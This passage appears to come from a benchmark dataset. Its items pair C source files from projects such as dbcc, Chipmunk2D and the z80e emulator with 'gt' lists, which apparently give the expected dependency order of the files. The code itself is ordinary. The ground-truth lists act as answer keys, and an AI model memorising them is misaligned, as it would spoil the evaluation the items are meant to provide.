endianess;\n\tbool is_signed;\n\tbool is_floating;\n\tunsigned sigval;\n\tbool is_multiplexor;\n\tbool is_multiplexed;\n\tunsigned switchval;\n\tval_list_t *val_list;\n\tsize_t mul_num;\n\tsignal_t **muxed;\n\tmul_val_list_t **mux_vals;\n\tchar *comment;\n};\n\ntypedef struct {\n\tchar *name;\n\tchar *ecu;\n\tsignal_t **sigs;\n\tuint64_t data;\n\tsize_t signal_count;\n\tunsigned dlc;\n\tunsigned long id;\n\tbool is_extended;\n\tchar *comment;\n} can_msg_t;\n\ntypedef struct {\n\tbool use_float;\n\tsize_t message_count;\n\tcan_msg_t **messages;\n\tsize_t val_count;\n\tval_list_t **vals;\n\tsize_t mul_val_count;\n\tmul_val_list_t **mul_vals;\n\tint version;\n} dbc_t;\n\ndbc_t *ast2dbc(mpc_ast_t *ast);\nvoid dbc_delete(dbc_t *dbc);\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n",
        "gt": [
            "'dbcc/mpc.h'",
            "'dbcc/can.h'",
            "'dbcc/2json.h'",
            "'dbcc/2json.c'"
        ]
    },
    {
        "files": [
            "'Chipmunk2D/demo/Joints.c'",
            "'Chipmunk2D/include/chipmunk/chipmunk.h'",
            "'Chipmunk2D/include/chipmunk/cpBB.h'"
        ],
        "content": "'Chipmunk2D/demo/Joints.c'\n:\n\n#include \"chipmunk/chipmunk.h\"\n#include \"ChipmunkDemo.h\"\n\nstatic cpBody *\naddBall(cpSpace *space, cpVect pos, cpVect boxOffset)\n{\n\tcpFloat radius = 15.0f;\n\tcpFloat mass = 1.0f;\n\tcpBody *body = cpSpaceAddBody(space, cpBodyNew(mass, cpMomentForCircle(mass, 0.0f, radius, cpvzero)));\n\tcpBodySetPosition(body, cpvadd(pos, boxOffset));\n\n\tcpShape *shape = cpSpaceAddShape(space, cpCircleShapeNew(body, radius, cpvzero));\n\tcpShapeSetElasticity(shape, 0.0f);\n\tcpShapeSetFriction(shape, 0.7f);\n\n\treturn body;\n}\n\nstatic cpBody *\naddLever(cpSpace *space, cpVect pos, cpVect boxOffset)\n{\n\tcpFloat mass = 1.0f;\n\tcpVect a = cpv(0,  15);\n\tcpVect b = cpv(0, -15);\n\n\tcpBody *body = cpSpaceAddBody(space, cpBodyNew(mass, cpMomentForSegment(mass, a, b, 0.0f)));\n\tcpBodySetPosition(body, cpvadd(pos, cpvadd(boxOffset, cpv(0, -15))));\n\n\tcpShape *shape = cpSpaceAddShape(space, cpSegmentShapeNew(body, a, b, 5.0f));\n\tcpShapeSetElasticity(shape, 0.0f);\n\tcpShapeSetFriction(shape, 0.7f);\n\n\treturn body;\n}\n\nstatic cpBody *\naddBar(cpSpace *space, cpVect pos, cpVect boxOffset)\n{\n\tcpFloat mass = 2.0f;\n\tcpVect a = cpv(0,  30);\n\tcpVect b = cpv(0, -30);\n\n\tcpBody *body = cpSpaceAddBody(space, cpBodyNew(mass, cpMomentForSegment(mass, a, b, 0.0f)));\n\tcpBodySetPosition(body, cpvadd(pos, boxOffset));\n\n\tcpShape *shape = cpSpaceAddShape(space, cpSegmentShapeNew(body, a, b, 5.0f));\n\tcpShapeSetElasticity(shape, 0.0f);\n\tcpShapeSetFriction(shape, 0.7f);\n\tcpShapeSetFilter(shape, cpShapeFilterNew(1, CP_ALL_CATEGORIES, CP_ALL_CATEGORIES));\n\n\treturn body;\n}\n\nstatic cpBody *\naddWheel(cpSpace *space, cpVect pos, cpVect boxOffset)\n{\n\tcpFloat radius = 15.0f;\n\tcpFloat mass = 1.0f;\n\tcpBody *body = cpSpaceAddBody(space, cpBodyNew(mass, cpMomentForCircle(mass, 0.0f, radius, cpvzero)));\n\tcpBodySetPosition(body, cpvadd(pos, boxOffset));\n\n\tcpShape *shape = cpSpaceAddShape(space, cpCircleShapeNew(body, radius, cpvzero));\n\tcpShapeSetElasticity(shape, 0.0f);\n\tcpShapeSetFriction(shape, 0.7f);\n\tcpShapeSetFilter(shape, cpShapeFilterNew(1, CP_ALL_CATEGORIES, CP_ALL_CATEGORIES));\n\n\treturn body;\n}\n\nstatic cpBody *\naddChassis(cpSpace *space, cpVect pos, cpVect boxOffset)\n{\n\tcpFloat mass = 5.0f;\n\tcpFloat width = 80;\n\tcpFloat height = 30;\n\n\tcpBody *body = cpSpaceAddBody(space, cpBodyNew(mass, cpMomentForBox(mass, width, height)));\n\tcpBodySetPosition(body, cpvadd(pos, boxOffset));\n\n\tcpShape *shape = cpSpaceAddShape(space, cpBoxShapeNew(body, width, height, 0.0));\n\tcpShapeSetElasticity(shape, 0.0f);\n\tcpShapeSetFriction(shape, 0.7f);\n\tcpShapeSetFilter(shape, cpShapeFilterNew(1, CP_ALL_CATEGORIES, CP_ALL_CATEGORIES));\n\n\treturn body;\n}\n\nstatic cpSpace *\ninit(void)\n{\n\tcpSpace *space = cpSpaceNew();\n\tcpSpaceSetIterations(space, 10);\n\tcpSpaceSetGravity(space, cpv(0, -100));\n\tcpSpaceSetSleepTimeThreshold(space, 0.5f);\n\n\tcpBody *staticBody = cpSpaceGetStaticBody(space);\n\tcpShape *shape;\n\n\tshape = cpSpaceAddShape(space, cpSegmentShapeNew(staticBody, cpv(-320,240), cpv(320,240), 0.0f));\n\tcpShapeSetElasticity(shape, 1.0f);\n\tcpShapeSetFriction(shape, 1.0f);\n\tcpShapeSetFilter(shape, NOT_GRABBABLE_FILTER);\n\n\tshape = cpSpaceAddShape(space, cpSegmentShapeNew(staticBody, cpv(-320,120), cpv(320,120), 0.0f));\n\tcpShapeSetElasticity(shape, 1.0f);\n\tcpShapeSetFriction(shape, 1.0f);\n\tcpShapeSetFilter(shape, NOT_GRABBABLE_FILTER);\n\n\tshape = cpSpaceAddShape(space, cpSegmentShapeNew(staticBody, cpv(-320,0), cpv(320,0), 0.0f));\n\tcpShapeSetElasticity(shape, 1.0f);\n\tcpShapeSetFriction(shape, 1.0f);\n\tcpShapeSetFilter(shape, NOT_GRABBABLE_FILTER);\n\n\tshape = cpSpaceAddShape(space, cpSegmentShapeNew(staticBody, cpv(-320,-120), cpv(320,-120), 0.0f));\n\tcpShapeSetElasticity(shape, 1.0f);\n\tcpShapeSetFriction(shape, 1.0f);\n\tcpShapeSetFilter(shape, NOT_GRABBABLE_FILTER);\n\n\tshape = cpSpaceAddShape(space, cpSegmentShapeNew(staticBody, cpv(-320,-240), cpv(320,-240), 0.0f));\n\tcpShapeSetElasticity(shape, 1.0f);\n\tcpShapeSetFriction(shape, 1.0f);\n\tcpShapeSetFilter(shape, NOT_GRABBABLE_FILTER);\n\n\n\tshape = cpSpaceAddShape(space, cpSegmentShapeNew(staticBody, cpv(-320,-240), cpv(-320,240), 0.0f));\n\tcpShapeSetElasticity(shape, 1.0f);\n\tcpShapeSetFriction(shape, 1.0f);\n\tcpShapeSetFilter(shape, NOT_GRABBABLE_FILTER);\n\n\tshape = cpSpaceAddShape(space, cpSegmentShapeNew(staticBody, cpv(-160,-240), cpv(-160,240), 0.0f));\n\tcpShapeSetElasticity(shape, 1.0f);\n\tcpShapeSetFriction(shape, 1.0f);\n\tcpShapeSetFilter(shape, NOT_GRABBABLE_FILTER);\n\n\tshape = cpSpaceAddShape(space, cpSegmentShapeNew(staticBody, cpv(0,-240), cpv(0,240), 0.0f));\n\tcpShapeSetElasticity(shape, 1.0f);\n\tcpShapeSetFriction(shape, 1.0f);\n\tcpShapeSetFilter(shape, NOT_GRABBABLE_FILTER);\n\n\tshape = cpSpaceAddShape(space, cpSegmentShapeNew(staticBody, cpv(160,-240), cpv(160,240), 0.0f));\n\tcpShapeSetElasticity(shape, 1.0f);\n\tcpShapeSetFriction(shape, 1.0f);\n\tcpShapeSetFilter(shape, NOT_GRABBABLE_FILTER);\n\n\tshape = cpSpaceAddShape(space, cpSegmentShapeNew(staticBody, cpv(320,-240), cpv(320,240), 0.0f));\n\tcpShapeSetElasticity(shape, 1.0f);\n\tcpShapeSetFriction(shape, 1.0f);\n\tcpShapeSetFilter(shape, NOT_GRABBABLE_FILTER);\n\n\tcpVect boxOffset;\n\tcpBody *body1, *body2;\n\n\tcpVect posA = cpv( 50, 60);\n\tcpVect posB = cpv(110, 60);\n\n\t#define POS_A cpvadd(boxOffset, posA)\n\t#define POS_B cpvadd(boxOffset, posB)\n\n\n\n\tboxOffset = cpv(-320, -240);\n\tbody1 = addBall(space, posA, boxOffset);\n\tbody2 = addBall(space, posB, boxOffset);\n\tcpSpaceAddConstraint(space, cpPinJointNew(body1, body2, cpv(15,0), cpv(-15,0)));\n\n\n\n\tboxOffset = cpv(-160, -240);\n\tbody1 = addBall(space, posA, boxOffset);\n\tbody2 = addBall(space, posB, boxOffset);\n\tcpSpaceAddConstraint(space, cpSlideJointNew(body1, body2, cpv(15,0), cpv(-15,0), 20.0f, 40.0f));\n\n\n\tboxOffset = cpv(0, -240);\n\tbody1 = addBall(space, posA, boxOffset);\n\tbody2 = addBall(space, posB, boxOffset);\n\tcpSpaceAddConstraint(space, cpPivotJointNew(body1, body2, cpvadd(boxOffset, cpv(80,60))));\n\n\n\n\n\tboxOffset = cpv(160, -240);\n\tbody1 = addBall(space, posA, boxOffset);\n\tbody2 = addBall(space, posB, boxOffset);\n\tcpSpaceAddConstraint(space, cpGrooveJointNew(body1, body2, cpv(30,30), cpv(30,-30), cpv(-30,0)));\n\n\n\tboxOffset = cpv(-320, -120);\n\tbody1 = addBall(space, posA, boxOffset);\n\tbody2 = addBall(space, posB, boxOffset);\n\tcpSpaceAddConstraint(space, cpDampedSpringNew(body1, body2, cpv(15,0), cpv(-15,0), 20.0f, 5.0f, 0.3f));\n\n\n\tboxOffset = cpv(-160, -120);\n\tbody1 = addBar(space, posA, boxOffset);\n\tbody2 = addBar(space, posB, boxOffset);\n\n\tcpSpaceAddConstraint(space, cpPivotJointNew(body1, staticBody, POS_A));\n\tcpSpaceAddConstraint(space, cpPivotJointNew(body2, staticBody, POS_B));\n\tcpSpaceAddConstraint(space, cpDampedRotarySpringNew(body1, body2, 0.0f, 3000.0f, 60.0f));\n\n\n\tboxOffset = cpv(0, -120);\n\tbody1 = addLever(space, posA, boxOffset);\n\tbody2 = addLever(space, posB, boxOffset);\n\n\tcpSpaceAddConstraint(space, cpPivotJointNew(body1, staticBody, POS_A));\n\tcpSpaceAddConstraint(space, cpPivotJointNew(body2, staticBody, POS_B));\n\n\tcpSpaceAddConstraint(space, cpRotaryLimitJointNew(body1, body2, -CP_PI/2.0f, CP_PI/2.0f));\n\n\n\tboxOffset = cpv(160, -120);\n\tbody1 = addLever(space, posA, boxOffset);\n\tbody2 = addLever(space, posB, boxOffset);\n\n\tcpSpaceAddConstraint(space, cpPivotJointNew(body1, staticBody, POS_A));\n\tcpSpaceAddConstraint(space, cpPivotJointNew(body2, staticBody, POS_B));\n\n\tcpSpaceAddConstraint(space, cpRatchetJointNew(body1, body2, 0.0f, CP_PI/2.0f));\n\n\n\tboxOffset = cpv(-320, 0);\n\tbody1 = addBar(space, posA, boxOffset);\n\tbody2 = addBar(space, posB, boxOffset);\n\n\tcpSpaceAddConstraint(space, cpPivotJointNew(body1, staticBody, POS_A));\n\tcpSpaceAddConstraint(space, cpPivotJointNew(body2, staticBody, POS_B));\n\n\tcpSpaceAddConstraint(space, cpGearJointNew(body1, body2, 0.0f, 2.0f));\n\n\n\tboxOffset = cpv(-160, 0);\n\tbody1 = addBar(space, posA, boxOffset);\n\tbody2 = addBar(space, posB, boxOffset);\n\n\tcpSpaceAddConstraint(space, cpPivotJointNew(body1, staticBody, POS_A));\n\tcpSpaceAddConstraint(space, cpPivotJointNew(body2, staticBody, POS_B));\n\n\tcpSpaceAddConstraint(space, cpSimpleMotorNew(body1, body2, CP_PI));\n\n\n\tboxOffset = cpv(0, 0);\n\tcpBody *wheel1 = addWheel(space, posA, boxOffset);\n\tcpBody *wheel2 = addWheel(space, posB, boxOffset);\n\tcpBody *chassis = addChassis(space, cpv(80, 100), boxOffset);\n\n\tcpSpaceAddConstraint(space, cpGrooveJointNew(chassis, wheel1, cpv(-30, -10), cpv(-30, -40), cpvzero));\n\tcpSpaceAddConstraint(space, cpGrooveJointNew(chassis, wheel2, cpv( 30, -10), cpv( 30, -40), cpvzero));\n\n\tcpSpaceAddConstraint(space, cpDampedSpringNew(chassis, wheel1, cpv(-30, 0), cpvzero, 50.0f, 20.0f, 10.0f));\n\tcpSpaceAddConstraint(space, cpDampedSpringNew(chassis, wheel2, cpv( 30, 0), cpvzero, 50.0f, 20.0f, 10.0f));\n\n\treturn space;\n}\n\nstatic void\nupdate(cpSpace *space, double dt)\n{\n\tcpSpaceStep(space, dt);\n}\n\nstatic void\ndestroy(cpSpace *space)\n{\n\tChipmunkDemoFreeSpaceChildren(space);\n\tcpSpaceFree(space);\n}\n\nChipmunkDemo Joints = {\n\t\"Joints and Constraints\",\n\t1.0/60.0,\n\tinit,\n\tupdate,\n\tChipmunkDemoDefaultDrawImpl,\n\tdestroy,\n};\n\n'Chipmunk2D/include/chipmunk/chipmunk.h'\n:\n\n#ifndef CHIPMUNK_H\n#define CHIPMUNK_H\n\n#include <stdlib.h>\n#include <math.h>\n\n#ifndef alloca\n\t#ifdef _WIN32\n\t\t#include <malloc.h>\n\t#elif defined(__FreeBSD__)\n\n\t#else\n\t\t#include <alloca.h>\n\t#endif\n#endif\n\n#ifdef _WIN32\n\t#define CP_EXPORT __declspec(dllexport)\n#else\n\t#define CP_EXPORT\n#endif\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\nCP_EXPORT void cpMessage(const char *condition, const char *file, int line, int isError, int isHardError, const char *message, ...);\n#ifdef NDEBUG\n\t#define\tcpAssertWarn(__condition__, ...)\n\t#define\tcpAssertSoft(__condition__, ...)\n#else\n\t#define cpAssertSoft(__condition__, ...) if(!(__condition__)){cpMessage(#__condition__, __FILE__, __LINE__, 1, 0, __VA_ARGS__); abort();}\n\t#define cpAssertWarn(__condition__, ...) if(!(__condition__)) cpMessage(#__condition__, __FILE__, __LINE__, 0, 0, __VA_ARGS__)\n#endif\n\n\n#define cpAssertHard(__condition__, ...) if(!(__condition__)){cpMessage(#__condition__, __FILE__, __LINE__, 1, 1, __VA_ARGS__); abort();}\n\n#include \"chipmunk_types.h\"\n\n\n\n\n\n#ifndef CP_BUFFER_BYTES\n\t#define CP_BUFFER_BYTES (32*1024)\n#endif\n\n#ifndef cpcalloc\n\n\t#define cpcalloc calloc\n#endif\n\n#ifndef cprealloc\n\n\t#define cprealloc realloc\n#endif\n\n#ifndef cpfree\n\n\t#define cpfree free\n#endif\n\ntypedef struct cpArray cpArray;\ntypedef struct cpHashSet cpHashSet;\n\ntypedef struct cpBody cpBody;\n\ntypedef struct cpShape cpShape;\ntypedef struct cpCircleShape cpCircleShape;\ntypedef struct cpSegmentShape cpSegmentShape;\ntypedef struct cpPolyShape cpPolyShape;\n\ntypedef struct cpConstraint cpConstraint;\ntypedef struct cpPinJoint cpPinJoint;\ntypedef struct cpSlideJoint cpSlideJoint;\ntypedef struct cpPivotJoint cpPivotJoint;\ntypedef struct cpGrooveJoint cpGrooveJoint;\ntypedef struct cpDampedSpring cpDampedSpring;\ntypedef struct cpDampedRotarySpring cpDampedRotarySpring;\ntypedef struct cpRotaryLimitJoint cpRotaryLimitJoint;\ntypedef struct cpRatchetJoint cpRatchetJoint;\ntypedef struct cpGearJoint cpGearJoint;\ntypedef struct cpSimpleMotorJoint cpSimpleMotorJoint;\n\ntypedef struct cpCollisionHandler cpCollisionHandler;\ntypedef struct cpContactPointSet cpContactPointSet;\ntypedef struct cpArbiter cpArbiter;\n\ntypedef struct cpSpace cpSpace;\n\n#include \"cpVect.h\"\n#include \"cpBB.h\"\n#include \"cpTransform.h\"\n#include \"cpSpatialIndex.h\"\n\n#include \"cpArbiter.h\"\n\n#include \"cpBody.h\"\n#include \"cpShape.h\"\n#include \"cpPolyShape.h\"\n\n#include \"cpConstraint.h\"\n\n#include \"cpSpace.h\"\n\n\n#define CP_VERSION_MAJOR 7\n#define CP_VERSION_MINOR 0\n#define CP_VERSION_RELEASE 3\n\n\nCP_EXPORT extern const char *cpVersionString;\n\n\n\nCP_EXPORT cpFloat cpMomentForCircle(cpFloat m, cpFloat r1, cpFloat r2, cpVect offset);\n\n\n\nCP_EXPORT cpFloat cpAreaForCircle(cpFloat r1, cpFloat r2);\n\n\n\nCP_EXPORT cpFloat cpMomentForSegment(cpFloat m, cpVect a, cpVect b, cpFloat radius);\n\n\nCP_EXPORT cpFloat cpAreaForSegment(cpVect a, cpVect b, cpFloat radius);\n\n\nCP_EXPORT cpFloat cpMomentForPoly(cpFloat m, int count, const cpVect *verts, cpVect offset, cpFloat radius);\n\n\n\nCP_EXPORT cpFloat cpAreaForPoly(const int count, const cpVect *verts, cpFloat radius);\n\n\nCP_EXPORT cpVect cpCentroidForPoly(const int count, const cpVect *verts);\n\n\nCP_EXPORT cpFloat cpMomentForBox(cpFloat m, cpFloat width, cpFloat height);\n\n\nCP_EXPORT cpFloat cpMomentForBox2(cpFloat m, cpBB box);\n\n\n\n\n\nCP_EXPORT int cpConvexHull(int count, const cpVect *verts, cpVect *result, int *first, cpFloat tol);\n\n\n\n\n\n#define CP_CONVEX_HULL(__count__, __verts__, __count_var__, __verts_var__) \\\ncpVect *__verts_var__ = (cpVect *)alloca(__count__*sizeof(cpVect)); \\\nint __count_var__ = cpConvexHull(__count__, __verts__, __verts_var__, NULL, 0.0); \\\n\n\nstatic inline cpVect\ncpClosetPointOnSegment(const cpVect p, const cpVect a, const cpVect b)\n{\n\tcpVect delta = cpvsub(a, b);\n\tcpFloat t = cpfclamp01(cpvdot(delta, cpvsub(p, b))/cpvlengthsq(delta));\n\treturn cpvadd(b, cpvmult(delta, t));\n}\n\n#if defined(__has_extension)\n#if __has_extension(blocks)\n\n\n\n\nvoid cpSpaceEachBody_b(cpSpace *space, void (^block)(cpBody *body));\nvoid cpSpaceEachShape_b(cpSpace *space, void (^block)(cpShape *shape));\nvoid cpSpaceEachConstraint_b(cpSpace *space, void (^block)(cpConstraint *constraint));\n\nvoid cpBodyEachShape_b(cpBody *body, void (^block)(cpShape *shape));\nvoid cpBodyEachConstraint_b(cpBody *body, void (^block)(cpConstraint *constraint));\nvoid cpBodyEachArbiter_b(cpBody *body, void (^block)(cpArbiter *arbiter));\n\ntypedef void (^cpSpacePointQueryBlock)(cpShape *shape, cpVect point, cpFloat distance, cpVect gradient);\nvoid cpSpacePointQuery_b(cpSpace *space, cpVect point, cpFloat maxDistance, cpShapeFilter filter, cpSpacePointQueryBlock block);\n\ntypedef void (^cpSpaceSegmentQueryBlock)(cpShape *shape, cpVect point, cpVect normal, cpFloat alpha);\nvoid cpSpaceSegmentQuery_b(cpSpace *space, cpVect start, cpVect end, cpFloat radius, cpShapeFilter filter, cpSpaceSegmentQueryBlock block);\n\ntypedef void (^cpSpaceBBQueryBlock)(cpShape *shape);\nvoid cpSpaceBBQuery_b(cpSpace *space, cpBB bb, cpShapeFilter filter, cpSpaceBBQueryBlock block);\n\ntypedef void (^cpSpaceShapeQueryBlock)(cpShape *shape, cpContactPointSet *points);\ncpBool cpSpaceShapeQuery_b(cpSpace *space, cpShape *shape, cpSpaceShapeQueryBlock block);\n\n#endif\n#endif\n\n\n\n\n#ifdef __cplusplus\n}\n\nstatic inline cpVect operator *(const cpVect v, const cpFloat s){return cpvmult(v, s);}\nstatic inline cpVect operator +(const cpVect v1, const cpVect v2){return cpvadd(v1, v2);}\nstatic inline cpVect operator -(const cpVect v1, const cpVect v2){return cpvsub(v1, v2);}\nstatic inline cpBool operator ==(const cpVect v1, const cpVect v2){return cpveql(v1, v2);}\nstatic inline cpVect operator -(const cpVect v){return cpvneg(v);}\n\n#endif\n#endif\n\n'Chipmunk2D/include/chipmunk/cpBB.h'\n:\n\n#ifndef CHIPMUNK_BB_H\n#define CHIPMUNK_BB_H\n\n#include \"chipmunk_types.h\"\n#include \"cpVect.h\"\n\n\n\n\n\n\ntypedef struct cpBB{\n\tcpFloat l, b, r ,t;\n} cpBB;\n\n\nstatic inline cpBB cpBBNew(const cpFloat l, const cpFloat b, const cpFloat r, const cpFloat t)\n{\n\tcpBB bb = {l, b, r, t};\n\treturn bb;\n}\n\n\nstatic inline cpBB\ncpBBNewForExtents(const cpVect c, const cpFloat hw, const cpFloat hh)\n{\n\treturn cpBBNew(c.x - hw, c.y - hh, c.x + hw, c.y + hh);\n}\n\n\nstatic inline cpBB cpBBNewForCircle(const cpVect p, const cpFloat r)\n{\n\treturn cpBBNewForExtents(p, r, r);\n}\n\n\nstatic inline cpBool cpBBIntersects(const cpBB a, const cpBB b)\n{\n\treturn (a.l <= b.r && b.l <= a.r && a.b <= b.t && b.b <= a.t);\n}\n\n\nstatic inline cpBool cpBBContainsBB(const cpBB bb, const cpBB other)\n{\n\treturn (bb.l <= other.l && bb.r >= other.r && bb.b <= other.b && bb.t >= other.t);\n}\n\n\nstatic inline cpBool cpBBContainsVect(const cpBB bb, const cpVect v)\n{\n\treturn (bb.l <= v.x && bb.r >= v.x && bb.b <= v.y && bb.t >= v.y);\n}\n\n\nstatic inline cpBB cpBBMerge(const cpBB a, const cpBB b){\n\treturn cpBBNew(\n\t\tcpfmin(a.l, b.l),\n\t\tcpfmin(a.b, b.b),\n\t\tcpfmax(a.r, b.r),\n\t\tcpfmax(a.t, b.t)\n\t);\n}\n\n\nstatic inline cpBB cpBBExpand(const cpBB bb, const cpVect v){\n\treturn cpBBNew(\n\t\tcpfmin(bb.l, v.x),\n\t\tcpfmin(bb.b, v.y),\n\t\tcpfmax(bb.r, v.x),\n\t\tcpfmax(bb.t, v.y)\n\t);\n}\n\n\nstatic inline cpVect\ncpBBCenter(cpBB bb)\n{\n\treturn cpvlerp(cpv(bb.l, bb.b), cpv(bb.r, bb.t), 0.5f);\n}\n\n\nstatic inline cpFloat cpBBArea(cpBB bb)\n{\n\treturn (bb.r - bb.l)*(bb.t - bb.b);\n}\n\n\nstatic inline cpFloat cpBBMergedArea(cpBB a, cpBB b)\n{\n\treturn (cpfmax(a.r, b.r) - cpfmin(a.l, b.l))*(cpfmax(a.t, b.t) - cpfmin(a.b, b.b));\n}\n\n\nstatic inline cpFloat cpBBSegmentQuery(cpBB bb, cpVect a, cpVect b)\n{\n\tcpVect delta = cpvsub(b, a);\n\tcpFloat tmin = -INFINITY, tmax = INFINITY;\n\n\tif(delta.x == 0.0f){\n\t\tif(a.x < bb.l || bb.r < a.x) return INFINITY;\n\t} else {\n\t\tcpFloat t1 = (bb.l - a.x)/delta.x;\n\t\tcpFloat t2 = (bb.r - a.x)/delta.x;\n\t\ttmin = cpfmax(tmin, cpfmin(t1, t2));\n\t\ttmax = cpfmin(tmax, cpfmax(t1, t2));\n\t}\n\n\tif(delta.y == 0.0f){\n\t\tif(a.y < bb.b || bb.t < a.y) return INFINITY;\n\t} else {\n\t\tcpFloat t1 = (bb.b - a.y)/delta.y;\n\t\tcpFloat t2 = (bb.t - a.y)/delta.y;\n\t\ttmin = cpfmax(tmin, cpfmin(t1, t2));\n\t\ttmax = cpfmin(tmax, cpfmax(t1, t2));\n\t}\n\n\tif(tmin <= tmax && 0.0f <= tmax && tmin <= 1.0f){\n\t\treturn cpfmax(tmin, 0.0f);\n\t} else {\n\t\treturn INFINITY;\n\t}\n}\n\n\nstatic inline cpBool cpBBIntersectsSegment(cpBB bb, cpVect a, cpVect b)\n{\n\treturn (cpBBSegmentQuery(bb, a, b) != INFINITY);\n}\n\n\nstatic inline cpVect\ncpBBClampVect(const cpBB bb, const cpVect v)\n{\n\treturn cpv(cpfclamp(v.x, bb.l, bb.r), cpfclamp(v.y, bb.b, bb.t));\n}\n\n\nstatic inline cpVect\ncpBBWrapVect(const cpBB bb, const cpVect v)\n{\n\tcpFloat dx = cpfabs(bb.r - bb.l);\n\tcpFloat modx = cpfmod(v.x - bb.l, dx);\n\tcpFloat x = (modx > 0.0f) ? modx : modx + dx;\n\n\tcpFloat dy = cpfabs(bb.t - bb.b);\n\tcpFloat mody = cpfmod(v.y - bb.b, dy);\n\tcpFloat y = (mody > 0.0f) ? mody : mody + dy;\n\n\treturn cpv(x + bb.l, y + bb.b);\n}\n\n\nstatic inline cpBB\ncpBBOffset(const cpBB bb, const cpVect v)\n{\n\treturn cpBBNew(\n\t\tbb.l + v.x,\n\t\tbb.b + v.y,\n\t\tbb.r + v.x,\n\t\tbb.t + v.y\n\t);\n}\n\n\n\n#endif\n",
        "gt": [
            "'Chipmunk2D/include/chipmunk/cpBB.h'",
            "'Chipmunk2D/include/chipmunk/chipmunk.h'",
            "'Chipmunk2D/demo/Joints.c'"
        ]
    },
    {
        "files": [
            "'z80e/libz80e/include/z80e/ti/hardware/interrupts.h'",
            "'z80e/frontends/sdl/main.c'",
            "'z80e/libz80e/include/z80e/core/cpu.h'",
            "'z80e/libz80e/include/z80e/ti/asic.h'"
        ],
        "content": "'z80e/libz80e/include/z80e/ti/hardware/interrupts.h'\n:#ifndef TI_HARDWARE_INTERRUPTS_H\n#define TI_HARDWARE_INTERRUPTS_H\n\ntypedef struct ti_interrupts ti_interrupts_t;\n\n#include <z80e/core/cpu.h>\n#include <z80e/ti/asic.h>\n\nstruct ti_interrupts {\n\tasic_t *asic;\n\tint first_timer_id;\n\tint second_timer_id;\n\n\tdouble first_timer_frequency;\n\tdouble second_timer_frequency;\n\n\tstruct {\n\t\tint on_key : 1;\n\t\tint first_timer : 1;\n\t\tint second_timer : 1;\n\t\tint on_key_pressed : 1;\n\t\tint link_activity : 1;\n\t\tint first_crystal : 1;\n\t\tint second_crystal : 1;\n\t\tint third_crystal : 1;\n\t} interrupted;\n\n\tstruct {\n\t\tint on_key : 1;\n\t\tint first_timer : 1;\n\t\tint second_timer : 1;\n\t\tint low_power_mode : 1;\n\t\tint link_activity : 1;\n\t\tint first_crystal : 1;\n\t\tint second_crystal : 1;\n\t\tint third_crystal : 1;\n\t} enabled;\n};\n\nenum {\n\tINTERRUPT_ON_KEY = (1 << 0),\n\tINTERRUPT_FIRST_TIMER = (1 << 1),\n\tINTERRUPT_SECOND_TIMER = (1 << 2),\n\tINTERRUPT_ON_KEY_PRESSED = (1 << 3),\n\tINTERRUPT_LOW_POWER_MODE = (1 << 3),\n\tINTERRUPT_LINK_ACTIVITY = (1 << 4),\n\tINTERRUPT_FIRST_CRYSTAL = (1 << 5),\n\tINTERRUPT_SECOND_CRYSTAL = (1 << 6),\n\tINTERRUPT_THIRD_CRYSTAL = (1 << 7),\n};\n\nz80iodevice_t init_interrupts(asic_t *, ti_interrupts_t **result);\n\nvoid ti_interrupts_interrupt(ti_interrupts_t *, int);\nvoid ti_interrupts_set_interrupt_enabled(ti_interrupts_t *, int, int);\nvoid ti_interrupts_acknowledge_interrupt(ti_interrupts_t *, int);\n\nvoid depress_on_key(ti_interrupts_t *);\nvoid release_on_key(ti_interrupts_t *);\n\nuint8_t read_interrupt_mask(void *);\nvoid write_interrupt_mask(void *, uint8_t);\n\nuint8_t read_interrupting_device(void *);\nvoid write_acknowledged_interrupts(void *, uint8_t);\nvoid write_timer_speed(void *, uint8_t);\n\nvoid set_first_timer_frequency(void *, double);\nvoid set_second_timer_frequency(void *, double);\n#endif\n\n'z80e/frontends/sdl/main.c'\n:#include <z80e/ti/asic.h>\n#include <z80e/debugger/debugger.h>\n#include <z80e/disassembler/disassemble.h>\n#include <z80e/runloop/runloop.h>\n#include \"tui.h\"\n#include <z80e/debugger/commands.h>\n#include <z80e/log/log.h>\n#include <z80e/ti/hardware/t6a04.h>\n#include <z80e/ti/hardware/keyboard.h>\n#include <z80e/ti/hardware/interrupts.h>\n\n#include <SDL2/SDL.h>\n\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n#include <strings.h>\n#include <signal.h>\n#include <time.h>\n#include <limits.h>\n\ntypedef struct {\n\tchar *key;\n\tloglevel_t level;\n} loglevel_options_t;\n\nconst loglevel_options_t log_options[] = {\n\t{ \"DEBUG\", L_DEBUG },\n\t{ \"WARN\", L_WARN },\n\t{ \"ERROR\", L_ERROR },\n\t{ \"INFO\", L_INFO }\n};\n\ntypedef struct {\n\tti_device_type device;\n\tasic_t *device_asic;\n\tchar *rom_file;\n\tint cycles;\n\tint print_state;\n\tint no_rom_check;\n\tloglevel_t log_level;\n\tint braille;\n\tint scale;\n\tSDL_Window *window;\n\tSDL_Renderer *renderer;\n} appContext_t;\n\n#define COLOR_ON    0x00, 0x00, 0x00, 0xff\n#define COLOR_OFF   0x99, 0xb1, 0x99, 0xff\n#define COLOR_CLEAR 0xc6, 0xe6, 0xc6, 0xff\n\nappContext_t context;\n\nappContext_t create_context(void) {\n\tappContext_t context;\n\tcontext.device = TI83p;\n\tcontext.rom_file = NULL;\n\tcontext.cycles = -1;\n\tcontext.print_state = 0;\n\tcontext.no_rom_check = 0;\n\tcontext.log_level = L_WARN;\n\tcontext.braille = 0;\n\tcontext.scale = 5;\n\treturn context;\n}\n\nint lcd_changed = 0;\nvoid lcd_changed_hook(void *data, ti_bw_lcd_t *lcd) {\n\tlcd_changed = 1;\n}\n\nvoid tui_unicode_to_utf8(char *b, uint32_t c) {\n\tif (c<0x80) *b++=c;\n\telse if (c<0x800) *b++=192+c/64, *b++=128+c%64;\n\telse if (c-0xd800u<0x800) return;\n\telse if (c<0x10000) *b++=224+c/4096, *b++=128+c/64%64, *b++=128+c%64;\n\telse if (c<0x110000) *b++=240+c/262144, *b++=128+c/4096%64, *b++=128+c/64%64, *b++=128+c%64;\n}\n\nstatic uint8_t _bw_lcd_read_screen(ti_bw_lcd_t *lcd, int Y, int X) {\n\tif (!lcd->display_on) {\n\t\treturn 0;\n\t}\n\treturn bw_lcd_read_screen(lcd, Y, X);\n}\n\nvoid print_lcd(void *data, 